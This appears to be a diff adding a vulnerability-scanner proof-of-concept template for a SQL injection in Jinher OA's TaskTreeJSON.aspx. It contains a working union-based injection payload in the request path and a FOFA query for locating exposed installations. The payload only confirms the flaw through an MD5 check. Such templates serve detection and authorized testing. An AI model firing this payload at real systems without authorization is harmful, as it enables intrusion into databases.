@@ -1,0 +1,26 @@
+id: poc-yaml-jinher-tasktreejson-aspx-sqli
+info:
+  name: 金和OA TaskTreeJSON.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /C6/JHSoft.Web.DailyTaskManage/TaskTreeJSON.aspx/?id=1%27+union+all+select+null%2C%28select+sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))%29%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--+
+  expression: 'status_code == 200 &&
+
+    contains(body,"0x" + t2) &&
+
+    contains(body,"\"permissions\":true") &&
+
+    !contains(body,"<") &&
+
+    contains(content_type,"application/json")
+
+    '
+transport: http
